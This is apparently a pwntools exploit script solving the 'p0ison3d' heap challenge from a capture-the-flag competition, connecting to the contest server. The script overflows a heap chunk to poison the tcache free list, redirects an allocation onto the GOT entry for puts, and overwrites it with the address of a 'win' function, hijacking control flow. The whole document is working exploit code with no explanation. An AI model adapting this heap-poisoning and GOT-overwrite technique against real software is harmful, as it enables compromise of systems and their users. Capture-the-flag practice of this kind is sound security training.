from pwn import *
import sys

elf = ELF("p0ison3d")
libc = ELF("libc-2.27.so")

# io = process(elf.path)
io = remote("2022.ductf.dev", 30024)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io)

def add(idx, data):
    io.sendlineafter(b"choice:\n", b"1")
    io.sendlineafter(b"index:\n", idx)
    io.sendlineafter(b"data:\n", data)

def edit(idx, data):
    io.sendlineafter(b"choice:\n", b"3")
    io.sendlineafter(b"index:\n", idx)
    io.recvuntil(b"data:\n")
    io.send(data)

def delete(idx):
    io.sendlineafter(b"choice:\n", b"4")
    io.sendlineafter(b"index:\n", idx)

add(b"0", b"AAA")
add(b"1", b"AAA")
add(b"2", b"AAA")
delete(b"2")
delete(b"1")

p = b"A" * 136
p += p64(0x91)
p += p64(elf.got["puts"])
edit(b"0", p)
add(b"1", b"AAA")
add(b"2", p64(elf.sym["win"]))

io.interactive()